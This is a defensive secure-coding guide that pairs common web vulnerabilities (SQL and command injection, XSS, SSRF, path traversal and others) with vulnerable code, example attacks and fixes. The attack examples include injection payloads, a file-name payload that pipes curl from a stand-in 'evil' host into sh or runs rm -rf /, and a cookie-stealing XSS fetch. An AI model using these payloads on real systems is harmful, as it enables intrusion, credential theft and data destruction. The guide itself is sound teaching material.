# Input Validation & Output Encoding

Two complementary controls:
- **Validate at the trust boundary** — when data enters (HTTP param, body, header, file, webhook, queue), check it against an **allowlist** of what's permitted (type, length, format, range, enum) and reject the rest. Allowlists fail safe; denylists always miss a case.
- **Encode at the sink** — when data is placed into a different context (SQL, shell, HTML, a URL, a file path), neutralize it *for that context* so it stays data and never becomes code/structure.

Assume every input is hostile, including ones read back from your own database (stored injection). Below: the vulnerable pattern, the attack, the fix, and CWE/OWASP ids.

---

## 1. SQL injection — CWE-89 / A03

```js
// ❌ Input concatenated into the query
db.query(`SELECT * FROM users WHERE name = '${name}' AND tenant = ${tenant}`);
```

**Attack:** `name = ' OR '1'='1` returns all rows; `'; DROP TABLE users;--`; `' UNION SELECT password,... --` exfiltrates other tables; blind/boolean payloads extract data one bit at a time.

```js
// ✅ Parameterized query — driver binds values, they never alter structure
db.query('SELECT * FROM users WHERE name = $1 AND tenant = $2', [name, tenant]);
// ORM: use its query builder / bind params, not raw interpolation
```

Identifiers (table/column names) can't be parameterized — if they come from input, map them through an **allowlist** of known names. Never build query strings from input.

---

## 2. NoSQL injection — CWE-943 / A03

```js
// ❌ Mongo: an object where a string is expected
db.users.findOne({ user: req.body.user, pass: req.body.pass });
```

**Attack:** Attacker sends JSON `{"user":"admin","pass":{"$ne":null}}`; `$ne:null` matches any non-null password → auth bypass. `$gt`, `$regex`, `$where` (JS execution) are similar.

```js
// ✅ Coerce/validate types so operators can't be injected
const user = String(req.body.user), pass = String(req.body.pass);
db.users.findOne({ user, pass });        // and disable $where; validate with a schema
```

Use a schema validator (Joi/zod) to reject non-string values at the boundary; configure the driver to reject query operators in user data.

---

## 3. OS command injection — CWE-78 / A03

```js
// ❌ User data in a shell string
exec(`convert ${req.query.file} out.png`);          // child_process.exec uses a shell
```

**Attack:** `file = a.png; rm -rf / #` or `$(curl evil.sh|sh)` runs arbitrary commands as the app — RCE. Shell metacharacters (`; | & $ \` > <`) are the vector.

```js
// ✅ No shell; pass args as an array so they can't be reinterpreted
execFile('convert', [req.query.file, 'out.png']);   // spawn/execFile, not exec
```

Better still, avoid shelling out — use a library. If the binary is unavoidable, allowlist the argument values and validate filenames. Never pass user input through `sh -c`.

---

## 4. Path traversal — CWE-22 / A01

```js
// ❌ User-controlled path joined to a base dir
res.sendFile(path.join('/var/data', req.query.file));
```

**Attack:** `file = ../../../../etc/passwd` (or an absolute path, or URL-encoded `..%2f`) escapes the base dir and reads arbitrary files — config, keys, `/etc/passwd`. On upload/write paths, it overwrites system files.

```js
// ✅ Resolve, then verify the result is still inside the base dir
const base = path.resolve('/var/data');
const target = path.resolve(base, req.query.file);
if (!target.startsWith(base + path.sep)) return res.sendStatus(400);
res.sendFile(target);
```

Prefer mapping an opaque id to a known filename over accepting paths at all. Reject `..`, NUL bytes, and absolute paths.

---

## 5. XSS — encode per context — CWE-79 / A03

XSS = injecting markup/script into a page. The fix is **context-correct output encoding**, applied at render. Modern frameworks auto-escape text — the findings are where authors *bypass* that.

```jsx
// ❌ React: dangerouslySetInnerHTML with user data → stored/reflected XSS
<div dangerouslySetInnerHTML={{ __html: comment }} />
```
```vue
<!-- ❌ Vue: v-html renders raw HTML -->
<div v-html="comment"></div>
```
```js
// ❌ Angular: bypassing the sanitizer
this.sanitizer.bypassSecurityTrustHtml(userInput);
// ❌ Vanilla: innerHTML / document.write with input
el.innerHTML = userInput;
```

**Attack:** `comment = <img src=x onerror="fetch('//evil/'+document.cookie)">` runs in every viewer's browser — session theft, account actions as the victim, keylogging. *Reflected* (in the response to a crafted URL), *stored* (saved then served to others), *DOM* (sink in client JS).

```jsx
// ✅ Let the framework escape — render as text
<div>{comment}</div>
```
- If you must render user HTML, sanitize with a vetted library (**DOMPurify**) and a strict allowlist — don't write your own.
- **Encode for the right context:** HTML body vs. attribute vs. JS string vs. URL each need different encoding. Putting input into `href`/`src` enables `javascript:` URLs — validate the scheme (`https:`/`mailto:`). Inside a `<script>` or inline event handler, HTML-encoding is *not* enough.
- Add a **Content-Security-Policy** as defense-in-depth (no `unsafe-inline`).

---

## 6. SSRF — CWE-918 / A10

```js
// ❌ Server fetches a user-supplied URL
const r = await fetch(req.body.webhookUrl);
```

**Attack:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/` returns cloud IAM credentials; `http://localhost:6379` / `http://10.0.0.5/admin` reach internal services behind the firewall. Redirects and DNS rebinding bypass naive checks.

```js
// ✅ Allowlist host + scheme, block private ranges, refuse redirects
const u = new URL(req.body.webhookUrl);
if (u.protocol !== 'https:' || !ALLOWED_HOSTS.has(u.hostname)) return res.sendStatus(400);
// resolve DNS and reject if the IP is private/link-local/loopback (10/8, 172.16/12,
// 192.168/16, 127/8, 169.254/16, ::1, fc00::/7); pin that IP for the request
const r = await fetch(u, { redirect: 'error' });
```

Validate the **resolved IP**, not just the hostname (DNS rebinding); disable or re-validate on redirects; egress-filter at the network layer too.

---

## 7. Insecure deserialization — CWE-502 / A08

```python
# ❌ Deserializing attacker-controlled bytes with a code-capable format
data = pickle.loads(request.body)            # python
yaml.load(request.body)                       # full-loader → object construction
```
```java
// ❌ new ObjectInputStream(...).readObject();   // Java native deserialization
```

**Attack:** These formats reconstruct arbitrary objects and invoke methods during load — crafted input triggers a gadget chain → RCE. `pickle`, Java native serialization, and `yaml.load` (non-safe) are all directly exploitable.

```python
# ✅ Use a data-only format, or the safe loader
data = json.loads(request.body)
yaml.safe_load(request.body)
```

Never deserialize untrusted input with a code-capable serializer. If unavoidable, sign the payload and verify before deserializing, and restrict allowed types.

---

## 8. ReDoS — catastrophic regex backtracking — CWE-1333 / A04

```js
// ❌ Nested/overlapping quantifiers on user input
const re = /^(a+)+$/;            // also (\d+)*$, (.*a){20}
re.test(userInput);
```

**Attack:** A crafted string (e.g. many `a`s then `!`) causes exponential backtracking; one request pins a CPU core for seconds-to-minutes — denial of service.

```js
// ✅ Avoid nested quantifiers; bound input length; use a linear-time engine (RE2)
if (userInput.length > 256) return reject();
const re = /^[a-z0-9]+$/;        // no overlapping quantifiers
```

Cap input length before matching, simplify the pattern, or run untrusted-pattern matching on RE2 (no catastrophic backtracking).

---

## 9. Mass assignment / over-posting — CWE-915 / A08

```js
// ❌ Whole request body bound to the model
const user = await User.create(req.body);    // body may include role, isAdmin, credits, id
```

**Attack:** Attacker adds fields the form never showed (`role:"admin"`, `verified:true`, `balance:99999`) and the binder writes them — privilege escalation or data tampering.

```js
// ✅ Allowlist the fields you accept (never blocklist)
const { name, email } = req.body;
const user = await User.create({ name, email });
```

Use DTOs / explicit field picking / framework "fillable" allowlists. Validate with a schema (zod/Joi) that strips unknown keys.

---

## 10. File upload — CWE-434 / A04/A08

```js
// ❌ Trusts the client-provided type/name, stores in webroot, executable
fs.writeFile(`/var/www/public/${file.originalname}`, file.buffer);
```

**Attack:** Upload `shell.php` (or `.jsp`/`.aspx`); if it lands in an executable web path, requesting it runs code → RCE. `Content-Type` and extension are attacker-controlled. Path in the name (`../`) enables traversal; huge files cause DoS.

```js
// ✅ Validate by content, cap size, randomize name, store outside webroot, no execute
if (!ALLOWED_MIME.has(detectFromMagicBytes(file.buffer))) return res.sendStatus(415);
if (file.size > MAX_BYTES) return res.sendStatus(413);
const name = crypto.randomUUID() + safeExt;            // don't trust originalname
await storeToBucket(name, file.buffer);                // object storage, served read-only
```

Check the real type (magic bytes), enforce a size cap, store on object storage or a non-executable dir, serve with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`, and scan if accepting documents.

---

## 11. Content-type & size limits — CWE-400 / A04

```js
// ❌ Unbounded body parser
app.use(express.json());                      // default-ish; large bodies → memory DoS
```

**Fix:** Set explicit limits (`express.json({ limit: '100kb' })`), reject unexpected `Content-Type`, and bound array/string sizes in the schema so a single request can't exhaust memory.

---

## The boundary principle (apply to every input)

1. **Identify the boundary** — where does this value enter the trust zone?
2. **Validate with an allowlist** — type, length, format, range, enum. Reject, don't sanitize-and-hope.
3. **Carry it as data** — parameterize for SQL, arg-array for shell, framework-escape for HTML.
4. **Encode at the sink for that context** — HTML/attr/JS/URL/path each differ.
5. **Fail closed** — on any validation failure, reject.

## Review checklist (input/output)

- [ ] SQL/NoSQL queries parameterized; identifiers allowlisted; types coerced.
- [ ] No shell concatenation; `execFile`/arg arrays; arguments allowlisted.
- [ ] File paths resolved and confirmed inside the base dir; no `..`/absolute.
- [ ] Output encoded per context; `dangerouslySetInnerHTML`/`v-html`/`bypassSecurityTrust`/`innerHTML` justified + sanitized (DOMPurify); CSP set.
- [ ] Outbound URLs allowlisted; private/metadata IPs blocked; redirects refused.
- [ ] No deserialization of untrusted data with code-capable formats.
- [ ] Regexes on input are linear / length-bounded (no ReDoS).
- [ ] Only allowlisted fields bound from the body (no mass assignment).
- [ ] Uploads validated by content + size, stored non-executable, random names.
- [ ] Body size and content-type limits enforced.
